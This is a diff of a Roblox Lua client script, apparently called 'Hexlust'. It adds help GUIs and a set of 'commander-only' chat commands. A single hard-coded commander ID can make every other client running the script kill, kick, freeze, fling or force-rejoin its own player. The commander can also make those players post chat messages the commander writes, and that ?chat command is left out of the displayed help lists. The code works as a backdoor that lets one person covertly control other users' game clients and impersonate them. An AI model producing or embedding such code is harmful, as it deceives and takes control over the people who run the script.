+                closeBtn.TextColor3 = Color3.new(1,1,1)
+                closeBtn.Font = Enum.Font.GothamBold
+                closeBtn.TextSize = 20
+                closeBtn.Parent = frame
+
+                local closeCorner = Instance.new("UICorner")
+                closeCorner.CornerRadius = UDim.new(0, 10)
+                closeCorner.Parent = closeBtn
+
+                local scroll = Instance.new("ScrollingFrame")
+                scroll.Size = UDim2.new(1, -20, 1, -70)
+                scroll.Position = UDim2.new(0, 10, 0, 60)
+                scroll.BackgroundTransparency = 1
+                scroll.ScrollBarThickness = 6
+                scroll.Parent = frame
+
+                local layout = Instance.new("UIListLayout")
+                layout.Padding = UDim.new(0, 8)
+                layout.SortOrder = Enum.SortOrder.LayoutOrder
+                layout.Parent = scroll
+
+                local cmdList = {
+                    {"?message [player] [text]", "Send popup message to someone"},
+                    {"?reqtp [player]", "Request to teleport to someone"},
+                    {"?quizbot", "Run QuizBot locally"},
+                    {"!dark / !pink / !red / !green / !blue / !purple", "Change your chat bubble color"},
+                }
+
+                for _, info in ipairs(cmdList) do
+                    local lbl = Instance.new("TextLabel")
+                    lbl.Size = UDim2.new(1, 0, 0, 26)
+                    lbl.BackgroundTransparency = 1
+                    lbl.TextXAlignment = Enum.TextXAlignment.Left
+                    lbl.TextWrapped = true
+                    lbl.Text = info[1] .. "   " .. info[2]
+                    lbl.TextColor3 = Color3.fromRGB(210, 210, 230)
+                    lbl.TextSize = 14
+                    lbl.Font = Enum.Font.Gotham
+                    lbl.Parent = scroll
+                end
+
+                closeBtn.MouseButton1Click:Connect(function()
+                    TweenService:Create(frame, TweenInfo.new(0.35), {Position = UDim2.new(0, -360, 1, -440)}):Play()
+                    task.delay(0.4, function() infoGui:Destroy() end)
+                end)
+
+                frame.Position = UDim2.new(0, -360, 1, -440)
+                TweenService:Create(frame, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0, 20, 1, -440)}):Play()
+                return
+            end
+
+            -- For ?help all — commander only, affects everyone
+            if cmd == "?help" then
+                if not isAll or senderId ~= COMMANDER_ID then return end
+
+                -- Show full GUI locally (everyone sees this when commander types ?help all)
+                local infoGui = Instance.new("ScreenGui")
+                infoGui.Name = "HexlustInfoGui"
+                infoGui.ResetOnSpawn = false
+                infoGui.Parent = PlayerGui
+
+                local frame = Instance.new("Frame")
+                frame.Size = UDim2.new(0, 340, 0, 420)
+                frame.Position = UDim2.new(0, 20, 1, -440)
+                frame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+                frame.BorderSizePixel = 0
+                frame.Parent = infoGui
+
+                local corner = Instance.new("UICorner")
+                corner.CornerRadius = UDim.new(0, 14)
+                corner.Parent = frame
+
+                local title = Instance.new("TextLabel")
+                title.Size = UDim2.new(1, 0, 0, 50)
+                title.BackgroundTransparency = 1
+                title.Text = "All Commands (Commander)"
+                title.TextColor3 = Color3.fromRGB(200, 220, 255)
+                title.TextSize = 22
+                title.Font = Enum.Font.GothamBold
+                title.Parent = frame
+
+                local closeBtn = Instance.new("TextButton")
+                closeBtn.Size = UDim2.new(0, 40, 0, 40)
+                closeBtn.Position = UDim2.new(1, -50, 0, 5)
+                closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+                closeBtn.Text = "X"
+                closeBtn.TextColor3 = Color3.new(1,1,1)
+                closeBtn.Font = Enum.Font.GothamBold
+                closeBtn.TextSize = 20
+                closeBtn.Parent = frame
+
+                local closeCorner = Instance.new("UICorner")
+                closeCorner.CornerRadius = UDim.new(0, 10)
+                closeCorner.Parent = closeBtn
+
+                local scroll = Instance.new("ScrollingFrame")
+                scroll.Size = UDim2.new(1, -20, 1, -70)
+                scroll.Position = UDim2.new(0, 10, 0, 60)
+                scroll.BackgroundTransparency = 1
+                scroll.ScrollBarThickness = 6
+                scroll.Parent = frame
+
+                local layout = Instance.new("UIListLayout")
+                layout.Padding = UDim.new(0, 8)
+                layout.SortOrder = Enum.SortOrder.LayoutOrder
+                layout.Parent = scroll
+
+                local cmdList = {
+                    {"?message [player] [text]", "Send popup message to someone"},
+                    {"?reqtp [player]", "Request to teleport to someone"},
+                    {"?quizbot", "Run QuizBot locally"},
+                    {"!dark / !pink / !red / !green / !blue / !purple", "Change your chat bubble color"},
+                    {"?message all [text]", "Message everyone (commander only)"},
+                    {"?reqtp all", "Request teleport from everyone (commander only)"},
+                    {"?qb all", "Run QuizBot on everyone (commander only)"},
+                    {"?help all", "Show this full list (commander only)"},
+                    {"?bring [player]", "Bring someone to you"},
+                    {"?kill [player]", "Kill someone"},
+                    {"?kick [player]", "Kick someone"},
+                    {"?rj [player]", "Force rejoin"},
+                    {"?freeze [player]", "Freeze someone"},
+                    {"?unfreeze [player]", "Unfreeze someone"},
+                    {"?fling [player]", "Fling someone"}
+                }
+
+                for _, info in ipairs(cmdList) do
+                    local lbl = Instance.new("TextLabel")
+                    lbl.Size = UDim2.new(1, 0, 0, 26)
+                    lbl.BackgroundTransparency = 1
+                    lbl.TextXAlignment = Enum.TextXAlignment.Left
+                    lbl.TextWrapped = true
+                    lbl.Text = info[1] .. "   " .. info[2]
+                    lbl.TextColor3 = Color3.fromRGB(210, 210, 230)
+                    lbl.TextSize = 14
+                    lbl.Font = Enum.Font.Gotham
+                    lbl.Parent = scroll
+                end
+
+                closeBtn.MouseButton1Click:Connect(function()
+                    TweenService:Create(frame, TweenInfo.new(0.35), {Position = UDim2.new(0, -360, 1, -440)}):Play()
+                    task.delay(0.4, function() infoGui:Destroy() end)
+                end)
+
+                frame.Position = UDim2.new(0, -360, 1, -440)
+                TweenService:Create(frame, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0, 20, 1, -440)}):Play()
+            end
+
+        elseif senderId ~= COMMANDER_ID then
+            return
+        else
+            -- Commander-only commands (bring, kill, etc.)
+            if cmd == "?bring" and #args >= 2 then
+                local tgtArg = args[2]
+                local destPlayer = nil
                 
-                task.delay(0.4, function()
-                    pcall(function()
-                        TeleportService:Teleport(game.PlaceId, LocalPlayer)
-                    end)
-                end)
-            end
-
-        elseif cmd == "?freeze" and #args >= 2 then
-            if affectsTarget(args[2]) and LocalPlayer.Character then
-                local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-                if h then
-                    isFrozen = true
-                    h.WalkSpeed = 0
-                    h.JumpPower = 0
+                local toIndex
+                for i = 3, #args do
+                    if args[i] == "to" then 
+                        toIndex = i 
+                        break 
+                    end
                 end
-            end
-
-        elseif cmd == "?unfreeze" and #args >= 2 then
-            if affectsTarget(args[2]) and LocalPlayer.Character then
-                local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-                if h then
-                    isFrozen = false
-                    h.WalkSpeed = origWalkSpeed
-                    h.JumpPower = origJumpPower
+                
+                if toIndex and toIndex + 1 <= #args then
+                    local destName = table.concat(args, " ", toIndex + 1)
+                    destPlayer = getPlayerByPartial(destName)
                 end
-            end
 
-        elseif cmd == "?fling" and #args >= 2 then
-            if affectsTarget(args[2]) and LocalPlayer.Character then
-                local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-                if root and hum then
-                    hum.PlatformStand = true
-                    hum:ChangeState(Enum.HumanoidStateType.Physics)
-
-                    for _, child in root:GetChildren() do
-                        if child:IsA("Attachment") or child:IsA("LinearVelocity") or child:IsA("AngularVelocity") then
-                            child:Destroy()
+                if affectsTarget(tgtArg) then
+                    local toPivot
+                    if destPlayer and destPlayer.Character and destPlayer.Character.PrimaryPart then
+                        toPivot = destPlayer.Character:GetPivot()
+                    else
+                        local commander = getCommander()
+                        if commander and commander.Character and commander.Character.PrimaryPart then
+                            toPivot = commander.Character:GetPivot()
                         end
                     end
+                    
+                    if toPivot and LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
+                        LocalPlayer.Character:PivotTo(toPivot)
+                    end
+                end
 
-                    local attach = Instance.new("Attachment")
-                    attach.Name = "FlingAttach"
-                    attach.Parent = root
-
-                    local linVel = Instance.new("LinearVelocity")
-                    linVel.Attachment0 = attach
-                    linVel.MaxAxesForce = Vector3.new(1e6, 1e6, 1e6)
-                    linVel.VectorVelocity = Vector3.new(
-                        math.random(-60, 60),
-                        math.random(250, 350),
-                        math.random(-60, 60)
-                    )
-                    linVel.Parent = root
-
-                    local angVel = Instance.new("AngularVelocity")
-                    angVel.Attachment0 = attach
-                    angVel.MaxTorque = 1e6
-                    angVel.AngularVelocity = Vector3.new(
-                        math.random(-25,25),
-                        math.random(-50,50),
-                        math.random(-25,25)
-                    )
-                    angVel.Parent = root
-
-                    task.delay(9, function()
-                        if linVel then linVel:Destroy() end
-                        if angVel then angVel:Destroy() end
-                        if attach then attach:Destroy() end
-                        if hum and hum.Health > 0 then
-                            hum.PlatformStand = false
-                            local explode = Instance.new("Explosion")
-                            explode.Position = root.Position + Vector3.new(0,5,0)
-                            explode.BlastPressure = 0
-                            explode.BlastRadius = 8
-                            explode.DestroyJointRadiusPercent = 0
-                            explode.Parent = workspace
-                            hum.Health = 0
-                        end
+            elseif cmd == "?chat" and #args >= 3 then
+                local tgtArg = args[2]
+                local msgStart = text:find(" ", text:find(" ", 1) + 1) or #text
+                local chatText = text:sub(msgStart + 1):match("^%s*(.-)%s*$")
+                
+                if chatText ~= "" and affectsTarget(tgtArg) then
+                    task.spawn(function()
+                        pcall(GeneralChannel.SendAsync, GeneralChannel, chatText)
                     end)
+                end
+
+            elseif cmd == "?kill" and #args >= 2 then
+                if affectsTarget(args[2]) and LocalPlayer.Character then
+                    local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                    if h then h.Health = 0 end
+                end
+
+            elseif cmd == "?kick" and #args >= 2 then
+                if affectsTarget(args[2]) then 
+                    LocalPlayer:Kick("sorri twin dada kicked u ;c") 
+                end
+
+            elseif cmd == "?rj" and #args >= 2 then
+                local tgtArg = args[2]
+                if affectsTarget(tgtArg) then
+                    local msg = LocalPlayer.DisplayName .. " is getting rebooted..."
+                    task.spawn(function()
+                        pcall(GeneralChannel.SendAsync, GeneralChannel, msg)
+                    end)
+                    
+                    task.delay(0.4, function()
+                        pcall(function()
+                            TeleportService:Teleport(game.PlaceId, LocalPlayer)
+                        end)
+                    end)
+                end
+
+            elseif cmd == "?freeze" and #args >= 2 then
+                if affectsTarget(args[2]) and LocalPlayer.Character then
+                    local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                    if h then
+                        isFrozen = true
+                        h.WalkSpeed = 0
+                        h.JumpPower = 0
+                    end
+                end
+
+            elseif cmd == "?unfreeze" and #args >= 2 then
+                if affectsTarget(args[2]) and LocalPlayer.Character then
+                    local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                    if h then
+                        isFrozen = false
+                        h.WalkSpeed = origWalkSpeed
+                        h.JumpPower = origJumpPower
+                    end
+                end
+
+            elseif cmd == "?fling" and #args >= 2 then
+                if affectsTarget(args[2]) and LocalPlayer.Character then
+                    local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                    local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                    if root and hum then
+                        hum.PlatformStand = true
+                        hum:ChangeState(Enum.HumanoidStateType.Physics)
+
+                        for _, child in root:GetChildren() do
+                            if child:IsA("Attachment") or child:IsA("LinearVelocity") or child:IsA("AngularVelocity") then
+                                child:Destroy()
+                            end
+                        end
+
+                        local attach = Instance.new("Attachment")
+                        attach.Name = "FlingAttach"
+                        attach.Parent = root
+
+                        local linVel = Instance.new("LinearVelocity")
+                        linVel.Attachment0 = attach
+                        linVel.MaxAxesForce = Vector3.new(1e6, 1e6, 1e6)
+                        linVel.VectorVelocity = Vector3.new(
+                            math.random(-60, 60),
+                            math.random(250, 350),
+                            math.random(-60, 60)
+                        )
+                        linVel.Parent = root
+
+                        local angVel = Instance.new("AngularVelocity")
+                        angVel.Attachment0 = attach
+                        angVel.MaxTorque = 1e6
+                        angVel.AngularVelocity = Vector3.new(
+                            math.random(-25,25),
+                            math.random(-50,50),
+                            math.random(-25,25)
+                        )
+                        angVel.Parent = root
+
+                        task.delay(9, function()
+                            if linVel then linVel:Destroy() end
+                            if angVel then angVel:Destroy() end
+                            if attach then attach:Destroy() end
+                            if hum and hum.Health > 0 then
+                                hum.PlatformStand = false
+                                local explode = Instance.new("Explosion")
+                                explode.Position = root.Position + Vector3.new(0,5,0)
+                                explode.BlastPressure = 0
+                                explode.BlastRadius = 8
+                                explode.DestroyJointRadiusPercent = 0
+                                explode.Parent = workspace
+                                hum.Health = 0
+                            end
+                        end)
+                    end
                 end
             end
         end
